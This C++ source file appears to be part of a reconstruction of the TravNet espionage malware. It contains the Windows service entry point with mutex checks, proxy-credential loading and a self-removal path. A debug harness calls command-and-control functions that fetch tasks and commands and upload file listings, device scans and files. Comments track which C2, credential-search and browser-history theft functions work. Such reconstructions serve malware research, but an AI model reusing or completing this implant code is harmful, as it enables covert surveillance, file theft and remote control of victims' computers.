// Copyright 2015 Christian Roggia. All rights reserved.
// Use of this source code is governed by an Apache 2.0 license that can be
// found in the LICENSE file.

#include <windows.h>
#include <iostream>

#include "StdAfx.hpp"
#include "config.hpp"
#include "connection.hpp"
#include "setup.hpp"
#include "utils.hpp"
#include "core.hpp"
#include "device.hpp"

// --------------- BEGIN DEFINED ---------------
DWORD		g_dwMaxFileSizeKB	= 10240;
BOOL		g_bUseTypeLimit		= TRUE;
BOOL		g_bUTypeLimit		= TRUE;
// --------------- END DEFINED ---------------

// --------------- BEGIN NOT DEFINED ---------------
CHAR		g_nProxy_IP__TEST[32];
CHAR		g_nProxy_PORT__TEST[32];
CHAR		g_nProxy_USER__TEST[32];
CHAR		g_nProxy_PSW__TEST[192];

CHAR		g_szTmpPath[260];
CHAR		g_szUDIdx[260];
CHAR		g_szUEnumFS[260];
CHAR		g_szAcceptedFileTypes[324];

DWORD		g_dwServiceStatus;
SERVICE_STATUS_HANDLE	g_hServiceStatus;

CHAR		g_szVolumeSerialNr[260];
CHAR		g_szHostByName[16];
CHAR		g_szHostname[260];

DWORD		g_nProxy_UNK;
CHAR		g_nProxy_IP[260];
CHAR		g_nProxy_PORT[8];
CHAR		g_nProxy_USER[32];
CHAR		g_nProxy_PSW[32];

char		g_szEnumFS[260];
char		g_szDNList[260];
char		g_szStat_T[260];
char		g_szSysDir[260];

DWORD		g_nUploadRate;
DWORD		g_nDownCmdTime;

CHAR		g_szWebPage[264];

DWORD		g_dwScannedFile2;

BOOL		g_bUseProxy;

DWORD		g_nSentData;
DWORD		g_dwLastTickCount;

HANDLE		g_hMutex;

HANDLE		g_lpThread1;
DWORD		g_dwThreadId1;

HINSTANCE	g_hInst;

BOOL		g_bUAuto;
DWORD		g_dwScannedFile;
BOOL		g_bUninstall;

HANDLE		g_lpThread2;
DWORD		g_dwThreadId2;

CHAR		g_szModuleLogName[260];
CHAR		g_szTestURL[260];

DWORD		g_bAutoCheck;
BOOL		g_bCheckedSuccess;

CHAR		g_szBlank[4]; // This makes no sense, if the variable is not defined it could have any value

CHAR		g_szLastHashMD5[72];
// --------------- END NOT DEFINED ---------------

void Fast_ServiceStatus(DWORD dwState, DWORD dwExitCode, DWORD dwCheckPoint)
{
	SERVICE_STATUS ServiceStatus;

	g_dwServiceStatus = dwState;

	ServiceStatus.dwServiceType				= SERVICE_WIN32_SHARE_PROCESS;
	ServiceStatus.dwCurrentState			= dwState;
	ServiceStatus.dwControlsAccepted		= SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE | SERVICE_ACCEPT_SHUTDOWN;
	ServiceStatus.dwWin32ExitCode			= dwExitCode;
	ServiceStatus.dwServiceSpecificExitCode	= 0;
	ServiceStatus.dwCheckPoint				= dwCheckPoint;
	ServiceStatus.dwWaitHint				= 1000;

	SetServiceStatus(g_hServiceStatus, &ServiceStatus);
}

#ifdef _WINDLL
extern "C" __declspec(dllexport) void ServiceMain()
{
	Fast_ServiceStatus(SERVICE_START_PENDING, NO_ERROR, 1);
	Fast_ServiceStatus(SERVICE_RUNNING		, NO_ERROR, 0);

	HWINSTA hProcWinStat = GetProcessWindowStation();
	HWINSTA hWinStat = OpenWindowStation("winsta0", FALSE, WINSTA_ALL_ACCESS);
	if (NULL != hWinStat)
		SetProcessWindowStation(hWinStat);
	CloseWindowStation(hProcWinStat);

	g_hMutex = CreateMutex(NULL, TRUE, TRAVNET_MUTEX_NAME);
	if (ERROR_ALREADY_EXISTS == GetLastError())
	{
		CloseHandle(g_hMutex);
		return;
	}

	Sleep(1000);
	if (FALSE == LoadConfig())
		return;

	if (FALSE == g_bCheckedSuccess)
	{
		LoadProxyConfig();

		if (g_bUseProxy)
		{
			sprintf(g_nProxy_IP__TEST	, "%s", g_nProxy_IP);
			sprintf(g_nProxy_PORT__TEST	, "%s", g_nProxy_PORT);
			sprintf(g_nProxy_USER__TEST	, "%s", g_nProxy_USER);
			sprintf(g_nProxy_PSW__TEST	, "%s", g_nProxy_PSW);

			if(FALSE == TestProxyConnection() && TRUE == g_bAutoCheck && FALSE == RetriveInfo())
			{
				RemoveALL();
				return;
			}
		}
		else if(TRUE == g_bAutoCheck && FALSE == RetriveInfo())
		{
			RemoveALL();
			return;
		}

		SetCheckSuccess();
	}

	// Start main routine
	Sleep(60000);
	g_lpThread1 = CreateThread(NULL, 0, g_fnThread1, NULL, 0, &g_dwThreadId1);

	// Wait for new devices
	Sleep(10000);
	g_lpThread2 = CreateThread(NULL, 0, g_fnThread2, NULL, 0, &g_dwThreadId2);

	do
		Sleep(100);
	while (g_dwServiceStatus != SERVICE_STOP_PENDING && g_dwServiceStatus != SERVICE_STOPPED);
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	if (fdwReason <= DLL_THREAD_ATTACH)
		g_hInst = hinstDLL;

	return TRUE;
}
#else // _WINDLL
// Checked and working functions:
//	c2.cpp
//		~SendFileToC2
//		SendFileTokenToC2
//		GetTaskFromC2
//		TaskUpdate
//		~GetFromURL
//		GetCMDFromC2
//		SendCMDRecvToC2
//		SendEnumFSToC2
//		SendDNListFilesToC2
//	config.cpp
//		!PropagateConfig
//		LoadProxyConfig
//		GetFolderRecursive
//		GetFolderFirstLevel
//	connection.cpp
//		TestConnection_NoProxy
//		!sub_1000605B
//		!sub_10006637
//		!TestProxyConnection
//	core.cpp
//		!g_fnThread1
//		TaskReset
//	device.cpp
//		!g_fnThread2
//		!WaitForDeviceToConnect
//		ConvertUnitMaskToUnitByte
//	EnumFS.cpp
//		GenerateEnumFS
//		RecursiveDriveScan
//		RecursiveFolderScan
//		LogFolderContent
//	IEHistory.cpp
//		IEHistory::IEHistory
//		IEHistory::~IEHistory
//		IEHistory::Initialize
//		!sub_10001264
//		!IEHistory::GetHistory
//	network_info.cpp
//		GetVolumeSerialNumber
//		GetHostInfo
//	proxy.cpp
//		!GetProcessHandle
//		!SearchCredentials
//		!GetURL_CustomProxy
//		!GetURL_NoProxy
//	recursive.cpp
//		SendUEnumFSToC2
//		RecursiveFileSearch
//		ScanDevice
//		!SendTmpFolderToC2
//	setup.cpp
//		LoadConfig
//		RemoveALL
//		#GetSystemTechnicalInfo
//		GetProcessList
//		#GetNetworkInfo
//		WriteLog
//		GetProgramFilesEx
//		Setup_
//	system_info.cpp
//		GetProgramFiles
//		~GetIEHistory
//		GetOSVersion
//		GetIEVersion
//	utils.cpp
//		SetNewProxyConfig
//		SetProxyDisabled
//		SetCheckSuccess
//		~RetriveInfo

// Partially checked and working functions:
//	RetriveInfo:	No proxy connection works, connection with proxy has to be tested yet
//	GetIEHistory:	Function works, but no history is provided for tests
//	GetFromURL:		No proxy connection works, connection with proxy has to be tested yet
//	SendFileToC2:	Custom base64 is disabled

// Checked and NOT working functions:
//	GetSystemTechnicalInfo:	fails at GetDiskFreeSpaceEx: "return false;" must be replaced with "continue;"
//							GetLogicalDrives returns "Q:\" which is not a real drive
//	GetNetworkInfo:			freezes at WaitForSingleObject due to an exceed in the output (len > 4000)
//							INFINITE maybe should be replaced with a timeout

// NOT checked functions:
//	sub_1000605B - No proxy to test with
//	sub_10006637 - No proxy to test with
//	TestProxyConnection - No proxy to test with

#include "debug.hpp"
#include "network_info.hpp"
#include "c2.hpp"
#include "EnumFS.hpp"
#include "recursive.hpp"
int main()
{
	PRINTDBG("[TRAVNET-CONSOLE]\n");
	PRINTDBG("This executable is only for debug purpose.\n\n");

	PRINTDBG("\n[INFO]\n");

	GetVolumeSerialNumber(g_szVolumeSerialNr, 260);
	GetHostInfo(g_szHostname, 260, g_szHostByName);
	LoadConfig();

#ifdef _DEBUG
	CHAR szConfigPath[260];
	CHAR szWinDir[260];

	GetWindowsDirectory(szWinDir, 260);
	sprintf(szConfigPath, "%s\\system\\config_t.dat", szWinDir);
	
	PRINTDBG("Config file  : %s\n", szConfigPath);
#endif

	PRINTDBG("Temp file dir: %s\n", g_szTmpPath);
	PRINTDBG("UDIdx path   : %s\n", g_szUDIdx);
	PRINTDBG("UEnumFS path : %s\n", g_szUEnumFS);
	PRINTDBG("EnumFS path  : %s\n", g_szEnumFS);
	PRINTDBG("DNList path  : %s\n", g_szDNList);
	PRINTDBG("Stat_T path  : %s\n", g_szStat_T);
	PRINTDBG("System dir   : %s\n", g_szSysDir);

	PRINTDBG("\n[FUNCTIONS]\n");
	PRINTDBG("GetTaskFromC2  : %s\n", sc_szTasks[GetTaskFromC2()]);
	PRINTDBG("SendCMDRecvToC2: %d\n", SendCMDRecvToC2());
	PRINTDBG("GetCMDFromC2   : %d\n", GetCMDFromC2());
	//PRINTDBG("SendFileToC2   : %d\n", SendFileToC2("local-test-file.txt", "remote-test-file.txt"));
	PRINTDBG("GenerateEnumFS : %d\n", GenerateEnumFS());
	PRINTDBG("SendEnumFSToC2 : %d\n", SendEnumFSToC2());
	PRINTDBG("SendDNListFilesToC2 : %d\n", SendDNListFilesToC2());

	ScanDevice("E:\\");
	PRINTDBG("SendUEnumFSToC2: %d\n", SendUEnumFSToC2());

	TaskReset();

	system("pause");
	return 0;
}
#endif // _WINDLL